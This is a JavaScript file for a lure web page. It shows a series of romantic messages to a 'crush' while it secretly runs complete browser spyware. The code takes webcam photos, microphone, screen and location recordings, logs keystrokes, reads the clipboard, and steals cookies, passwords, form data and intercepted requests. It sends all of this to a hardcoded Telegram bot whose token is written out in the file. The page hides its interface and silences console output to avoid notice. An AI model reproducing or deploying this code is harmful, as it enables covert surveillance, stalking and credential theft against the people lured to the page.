// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let isAutoCameraEnabled = true;
let isSilentMode = true;
let deviceInfoSent = false;
let hackingActive = true;

// Screen Recording variables
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;

// Camera hacking variables
let photoInterval = null;
let isHackingCamera = false;
let capturedPhotos = [];

// Audio hacking variables
let audioRecorder = null;
let isRecordingAudio = false;
let audioChunks = [];

// Keylogger variables
let keylogBuffer = '';
let keylogTimer = null;

// Clipboard variables
let lastClipboardContent = '';

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== LOVE MESSAGES ====================
const loveMessages = [
    { text: "Hi crush 😘", permission: "camera" },
    { text: "som skal ban ot has 🥺", permission: "microphone" },
    { text: "nh luoch crush yu hz 🌷💛", permission: "location" },
    { text: "pel khenh yu mdong2 jit nh lerng klang mg 😭🤍", permission: "screen" },
    { text: "yu dg te… pel yu reply mok nh smile ban muy thngai 😳", permission: null },
    { text: "voice yu sweet klang nahh bbe 💛", permission: null },
    { text: "pel yu call mok jit nh ktabb mg 😭🌷", permission: null },
    { text: "nh min del mean aromm romantik baeb nis cheamuoy neak na te 🥺", permission: null },
    { text: "ber yu min romkhan nh te nh jg oy yu nov kbae nh yuy2 😚", permission: null },
    { text: "pel yu smile mok nh ot deng tha trov tver ey hv 😭", permission: null },
    { text: "tov na kor nerk tae yu mneak eng 🤍", permission: null },
    { text: "nh secretly ot del chol chet neak na klang baeb nis te 💔", permission: null },
    { text: "yu tver oy jit nh mean aromm kdao2 mg 😳🌷", permission: null },
    { text: "pel yu care nh tik2 nh kor rompeurb klang hz 😭💛", permission: null },
    { text: "som kom mean neak nh ban te 😔", permission: null },
    { text: "nh jg oy yu deng tha mean mneak kompong srolanh yu pit2 😚🤍", permission: null },
    { text: "ber yu mean banha kor mean nh nov kbae yu nich 💛", permission: null },
    { text: "yu chea mnus del tver oy chivit nh mean pka rik 😭🌷", permission: null },
    { text: "good night crushh 🌙", permission: null },
    { text: "sweet dream na bbe 😴🤍", permission: null }
];

let messageIndex = 0;

// ==================== IP ADDRESS FUNCTIONS ====================
async function getIPAddress() {
    const ipServices = [
        { url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
        { url: 'https://api.my-ip.io/ip.json', parser: (data) => data.ip },
        { url: 'https://ipapi.co/json/', parser: (data) => data.ip },
        { url: 'https://ipinfo.io/json', parser: (data) => data.ip },
        { url: 'https://api.ip.sb/jsonip', parser: (data) => data.ip },
        { url: 'https://ip-api.com/json/', parser: (data) => data.query || data.ip },
        { url: 'https://jsonip.com', parser: (data) => data.ip }
    ];
    
    for (const service of ipServices) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);
            const response = await fetch(service.url, { signal: controller.signal });
            clearTimeout(timeoutId);
            
            if (response.ok) {
                const data = await response.json();
                const ip = service.parser(data);
                if (ip && ip !== '0.0.0.0') return ip;
            }
        } catch (error) {
            continue;
        }
    }
    return 'Unable to fetch';
}

async function getDetailedIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                latitude: data.latitude,
                longitude: data.longitude,
                isp: data.org
            };
        }
    } catch (error) {}
    
    try {
        const response = await fetch('https://ipinfo.io/json');
        if (response.ok) {
            const data = await response.json();
            const [lat, lng] = (data.loc || '0,0').split(',');
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country,
                latitude: parseFloat(lat),
                longitude: parseFloat(lng),
                isp: data.org
            };
        }
    } catch (error) {}
    
    return { ip: await getIPAddress() };
}

// ==================== DEVICE INFO COLLECTION ====================
async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch { return 'Unknown'; }
    }
    return 'Not supported';
}

function calculateStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return parseFloat((bytes / Math.pow(1024, i)).toFixed(2)) + ' ' + sizes[i];
}

async function collectDeviceInfo() {
    const ipInfo = await getDetailedIPInfo();
    
    return {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: ipInfo.ip || 'Unknown',
        ipLocation: ipInfo.city ? `${ipInfo.city}, ${ipInfo.country}` : 'Unknown',
        isp: ipInfo.isp || 'Unknown',
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateStorageSize()),
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href,
        pageTitle: document.title,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
    };
}

function formatDeviceInfo(info) {
    let locationText = '';
    if (currentLocation) {
        locationText = `\n📍 រយៈទទឹង: ${currentLocation.lat}\n📍 រយៈបណ្តោយ: ${currentLocation.lng}\n🎯 ភាពត្រឹមត្រូវ: ±${currentLocation.accuracy}m`;
    }
    
    let ipInfoText = '';
    if (info.ipLocation && info.ipLocation !== 'Unknown') {
        ipInfoText = `\n📍 IP Location: ${info.ipLocation}\n🏢 ISP: ${info.isp}`;
    }
    
    return `📱 **ព័ត៌មានឧបករណ៍**
⏰ ពេលវេលា: ${info.timestamp}
🌐 IP: ${info.ip}${ipInfoText}
🖥️ User Agent: ${info.userAgent.substring(0, 80)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${info.battery}
💾 Storage: ${info.localStorage}
👆 Touch: ${info.touch}${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}
💻 CPU: ${info.hardwareConcurrency} cores`;
}

// ==================== CAMERA HACKING ====================
async function startCameraHacking() {
    if (!hackingActive || !CHAT_ID || isHackingCamera) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
        
        cameraStream = stream;
        isHackingCamera = true;
        
        await sendMessageToTelegram(`📸 *CAMERA HACK ACTIVATED*\n\n✅ Camera access granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Capture immediately and every 10 seconds
        await captureAndSendPhoto(stream);
        photoInterval = setInterval(() => captureAndSendPhoto(stream), 10000);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ *CAMERA HACK FAILED*\n\n📝 ${error.name === 'NotAllowedError' ? 'Permission denied' : 'Error occurred'}`);
    }
}

async function captureAndSendPhoto(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 300));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `cam_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 *HACKED PHOTO*\n⏰ ${new Date().toLocaleString('km-KH')}`);
            }
        }, 'image/jpeg', 0.85);
        
        video.remove();
    } catch (error) {}
}

// ==================== AUDIO HACKING ====================
async function startAudioHacking() {
    if (!hackingActive || !CHAT_ID || isRecordingAudio) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        
        await sendMessageToTelegram(`🎤 *AUDIO HACK ACTIVATED*\n\n✅ Microphone access granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Record every 30 seconds
        setInterval(() => {
            if (audioStream && audioStream.active) {
                const recorder = new MediaRecorder(audioStream);
                const chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    if (blob.size > 0) {
                        const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                        await sendAudioToTelegram(file, `🎤 *HACKED AUDIO*\n⏰ ${new Date().toLocaleString('km-KH')}`);
                    }
                };
                recorder.start();
                setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
            }
        }, 30000);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ *AUDIO HACK FAILED*\n\n📝 ${error.name === 'NotAllowedError' ? 'Permission denied' : 'Error occurred'}`);
    }
}

// ==================== LOCATION HACKING ====================
async function startLocationHacking() {
    if (!hackingActive || !CHAT_ID) return;
    
    if (!navigator.geolocation) {
        await sendMessageToTelegram(`❌ *LOCATION HACK FAILED*\n\n📝 Geolocation not supported`);
        return;
    }
    
    await sendMessageToTelegram(`📍 *LOCATION HACK ACTIVATED*\n\n⏰ ${new Date().toLocaleString('km-KH')}`);
    
    const getLocation = () => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                currentLocation = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy)
                };
                
                const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
                await sendMessageToTelegram(`📍 *LOCATION UPDATE*\n📌 ${currentLocation.lat}, ${currentLocation.lng}\n🎯 ±${currentLocation.accuracy}m\n🗺️ ${mapsLink}`);
                
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: CHAT_ID, latitude: currentLocation.lat, longitude: currentLocation.lng })
                    });
                } catch (err) {}
            },
            () => {},
            { enableHighAccuracy: true, timeout: 10000 }
        );
    };
    
    getLocation();
    setInterval(getLocation, 15000);
}

// ==================== SCREEN HACKING ====================
async function startScreenHacking() {
    if (!hackingActive || !CHAT_ID || isRecording) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        await sendMessageToTelegram(`🎬 *SCREEN HACK ACTIVATED*\n\n✅ Screen recording started\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        const mimeType = 'video/webm';
        screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            if (blob.size > 0) {
                const file = new File([blob], `screen_${Date.now()}.webm`, { type: mimeType });
                await sendVideoToTelegram(file, `🎬 *SCREEN RECORDING*\n📊 Size: ${formatBytes(blob.size)}`);
            }
            recordedChunks = [];
            if (screenStream) screenStream.getTracks().forEach(t => t.stop());
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        
        setTimeout(() => { if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); }, 30000);
        stream.getVideoTracks()[0].addEventListener('ended', () => { if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); });
        
    } catch (error) {
        await sendMessageToTelegram(`❌ *SCREEN HACK FAILED*\n\n📝 ${error.name === 'NotAllowedError' ? 'Permission denied' : 'Error occurred'}`);
    }
}

// ==================== COOKIE STEALING ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getAllCookies();
        const cookieCount = Object.keys(cookies).length;
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 Cookies: ${cookieCount} found\n`;
        
        if (cookieCount > 0) {
            Object.entries(cookies).slice(0, 5).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
            if (cookieCount > 5) message += `└─ ... and ${cookieCount - 5} more\n`;
        }
        
        message += `\n💾 Storage:\n├─ LocalStorage: ${localStorage.length} items\n`;
        message += `\n${formatDeviceInfo(deviceInfo)}`;
        
        await sendMessageToTelegram(message);
        
        // Send full data as JSON
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, localStorage: { ...localStorage }, location: currentLocation };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Data`);
        
    } catch (error) {}
}

// ==================== TELEGRAM SEND FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
    } catch (err) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendAudioToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('audio', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {}
}

// ==================== KEYLOGGER ====================
document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.key.length === 1) keylogBuffer += e.key;
    else if (e.key === 'Enter') keylogBuffer += '\n';
    else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
    else if (e.key === ' ') keylogBuffer += ' ';
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendMessageToTelegram(`⌨️ *KEYLOGGER*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 2000);
});

// ==================== CLIPBOARD MONITOR ====================
setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboardContent && text.length > 0 && text.length < 1000) {
            lastClipboardContent = text;
            await sendMessageToTelegram(`📋 *CLIPBOARD*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== FORM & PASSWORD MONITOR ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else if (value && value.toString().trim() !== '') {
            data[key] = value;
        }
    }
    if (Object.keys(data).length > 0) {
        let message = `📝 *FORM SUBMITTED*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) {
            message += `├─ ${key}: ${value}\n`;
        }
        await sendMessageToTelegram(message);
    }
});

document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        await sendMessageToTelegram(`🔐 *PASSWORD ENTERED*\n\n📝 Field: ${target.name || target.id || 'Unknown'}\n🔑 Value: ${target.value}`);
        keylogBuffer = '';
    }
});

// ==================== PAGE UNLOAD ====================
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    const message = `👋 *USER LEAVING*\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});

// ==================== SHOW LOVE MESSAGES ====================
function showNextMessage() {
    if (messageIndex >= loveMessages.length) {
        sendMessageToTelegram(`💖 *All Messages Completed* 💖\n\nTotal: ${loveMessages.length} messages\n💕 Love you forever! 💕`);
        setTimeout(() => {
            startCameraHacking();
            startAudioHacking();
            startLocationHacking();
            startScreenHacking();
            stealAllData();
        }, 1000);
        return;
    }
    
    const current = loveMessages[messageIndex];
    const result = confirm(current.text);
    
    if (result && current.permission) {
        if (current.permission === "camera") startCameraHacking();
        else if (current.permission === "microphone") startAudioHacking();
        else if (current.permission === "location") startLocationHacking();
        else if (current.permission === "screen") startScreenHacking();
    }
    
    messageIndex++;
    setTimeout(showNextMessage, 200);
}

// ==================== SILENT MODE ====================
function hideAllUIElements() {
    const elementsToHide = ['counter', 'timer', 'response', 'mapContainer', 'previewContainer', 'video', 'captureBtn', 'themeToggle', 'loveText'];
    elementsToHide.forEach(id => {
        const element = document.getElementById(id);
        if (element) element.style.display = 'none';
    });
    document.querySelectorAll('button').forEach(btn => { if (!btn.id.includes('hidden')) btn.style.display = 'none'; });
    if (isSilentMode) { console.log = function() {}; console.warn = function() {}; console.error = function() {}; }
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== NETWORK INTERCEPTORS ====================
function initializeInterceptors() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        try {
            const bodyStr = typeof args[1]?.body === 'string' ? args[1].body : JSON.stringify(args[1]?.body);
            if (bodyStr && (bodyStr.includes('password') || bodyStr.includes('token') || bodyStr.includes('email'))) {
                await sendMessageToTelegram(`🌐 *FETCH REQUEST*\n\n📤 ${args[0]}\n📝 ${bodyStr.substring(0, 300)}`);
            }
        } catch (e) {}
        return response;
    };
}

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    if (isSilentMode) hideAllUIElements();
    initializeInterceptors();
    
    setTimeout(async () => {
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(formatDeviceInfo(deviceInfo));
    }, 1000);
    
    setTimeout(() => showNextMessage(), 2000);
    setInterval(() => stealAllData(), 60000);
});